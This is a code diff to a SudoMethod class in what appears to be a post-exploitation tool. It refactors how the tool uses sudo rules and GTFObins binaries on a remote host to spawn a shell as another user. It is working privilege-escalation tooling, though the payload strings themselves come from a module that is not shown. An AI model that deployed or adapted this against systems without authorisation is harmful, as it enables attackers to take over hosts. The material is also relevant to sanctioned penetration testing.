@@ -182,17 +182,16 @@ class SudoMethod(Method):
             if current_user["password"] is None and sudo_privesc["password"]:
                 continue
 
-            if sudo_privesc["command"] == "ALL":
-                command_path = self.pty.shell
-            else:
-                command_path = shlex.split(sudo_privesc["command"])[0]
-
-            binary = gtfobins.Binary.find(command_path)
-            if binary is None or binary.shell("") is None:
-                continue
-            if sudo_privesc["command"] == "ALL" and binary.shell("") is None:
-                continue
-            if sudo_privesc["command"] != "ALL" and binary.sudo("", "", "") is None:
+            try:
+                # Locate a GTFObins binary which satisfies the given sudo spec.
+                # The PtyHandler.which method is used to verify the presence of
+                # different GTFObins on the remote system when an "ALL" spec is
+                # found.
+                sudo_privesc["command"], binary = gtfobins.Binary.find_sudo(
+                    sudo_privesc["command"], self.pty.which
+                )
+            except gtfobins.SudoNotPossible:
+                # No GTFObins possible with this sudo spec
                 continue
 
             if sudo_privesc["run_as_user"] == "ALL":
@@ -222,7 +221,7 @@ class SudoMethod(Method):
 
         current_user = self.pty.current_user
 
-        binary, command, password_required = technique.ident
+        binary, sudo_spec, password_required = technique.ident
 
         info(
             f"attempting potential privesc with sudo {Fore.GREEN}{Style.BRIGHT}{binary.path}{Style.RESET_ALL}",
@@ -231,15 +230,11 @@ class SudoMethod(Method):
         before_shell_level = self.pty.run("echo $SHLVL").strip()
         before_shell_level = int(before_shell_level) if before_shell_level != b"" else 0
 
-        sudo_prefix = f"sudo -u {technique.user} "
-        if command == "ALL":
+        shell_payload, input, exit = binary.sudo_shell(
+            technique.user, sudo_spec, self.pty.shell
+        )
 
-            shell_payload, input, exit = binary.shell(
-                self.pty.shell, sudo_prefix=sudo_prefix
-            )
-        else:
-            payload, input, exit = binary.sudo(sudo_prefix, command, self.pty.shell)
-            shell_payload = f" {payload}"
+        print(shell_payload)
 
         # Run the commands
         self.pty.run(shell_payload + "\n", wait=False)
@@ -250,23 +245,24 @@ class SudoMethod(Method):
         # Provide stdin if needed
         self.pty.client.send(input.encode("utf-8"))
 
-        # Give it a bit to let the shell start
+        # Give it a bit to let the shell start. We considered a sleep here, but
+        # that was not consistent. This will utilizes the logic in `run` for
+        # waiting for the output of the command (`echo`), which waits the
+        # appropriate amount of time.
         self.pty.run("echo")
 
         user = self.pty.whoami()
         if user == technique.user:
             success("privesc succeeded")
             return exit
-        else:
-            error(f"privesc failed (still {user} looking for {technique.user})")
 
-            after_shell_level = self.pty.run("echo $SHLVL").strip()
-            after_shell_level = (
-                int(after_shell_level) if after_shell_level != b"" else 0
-            )
+        error(f"privesc failed (still {user} looking for {technique.user})")
 
-            if after_shell_level > before_shell_level:
-                info("exiting spawned inner shell")
-                self.pty.run(exit, wait=False)  # here be dragons
+        after_shell_level = self.pty.run("echo $SHLVL").strip()
+        after_shell_level = int(after_shell_level) if after_shell_level != b"" else 0
+
+        if after_shell_level > before_shell_level:
+            info("exiting spawned inner shell")
+            self.pty.run(exit, wait=False)  # here be dragons
 
         raise PrivescError("failed to privesc")
